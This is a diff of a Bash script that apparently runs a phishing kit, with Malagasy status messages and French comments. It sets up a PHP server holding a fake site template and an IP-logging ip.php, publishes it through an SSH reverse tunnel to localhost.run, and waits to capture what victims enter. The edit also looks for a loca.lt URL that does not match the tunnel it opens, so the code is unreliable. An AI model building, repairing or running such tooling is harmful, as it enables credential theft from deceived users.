@@ -230,11 +230,14 @@ cusport() {
 }
 
 setup_site() {
-    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Manamboatra ny tranokala...${WHITE}"
+    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Manamboatra ny tranokala..."
+    mkdir -p .server/www
     cp -rf .sites/"$website"/* .server/www/ 2>/dev/null
     cp -f .sites/ip.php .server/www/ 2>/dev/null
-    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Manomboka ny server PHP amin'ny Port $PORT...${WHITE}"
-    cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Manomboka ny server PHP..."
+    
+    # L'utilisation des parenthèses () empêche le cd de bloquer le reste du script
+    (cd .server/www && php -S "$HOST":"$PORT" >/dev/null 2>&1 &)
 }
 
 e_ip() {
@@ -275,10 +278,11 @@ start_ssh_tunnel() {
     echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Manomboka ny tunnel (Localhost.run)..."
     setup_site
     
-    # Nettoyage de l'ancien log
+    # S'assurer que le dossier .server existe à la racine du projet
+    mkdir -p .server
     rm -f .server/ssh.log
     
-    # Lancement du tunnel SSH en arrière-plan avec -N et nokey
+    # Lancement du tunnel SSH en arrière-plan
     ssh -o StrictHostKeyChecking=no -N -R 80:127.0.0.1:$PORT nokey@localhost.run > .server/ssh.log 2>&1 &
     
     echo -e "${RED}[${WHITE}-${RED}]${YELLOW} Miandry ny famoronana ny rohy..."
@@ -287,15 +291,9 @@ start_ssh_tunnel() {
     clear; banner_small
     echo -e "${RED}[${WHITE}-${RED}]${GREEN} Rohy azo (URL) :"
     
-    # Utilisation d'un filtre plus large pour être sûr d'attraper l'URL loca.lt
+    # Extraction propre de l'URL loca.lt
     grep -o "https://[a-zA-Z0-9.-]*\.loca\.lt" .server/ssh.log
     
-    # Si le grep ne trouve rien, on affiche le contenu brut du log pour déboguer
-    if [ ! -s .server/ssh.log ]; then
-        echo -e "${RED}[${WHITE}!${RED}]${RED} Tsy misy ao amin'ny log ny rohy. Jerena ny olana..."
-        cat .server/ssh.log
-    fi
-
     echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Miandry ny fidiran'ny mpampiasa..."
     capture_data
 }
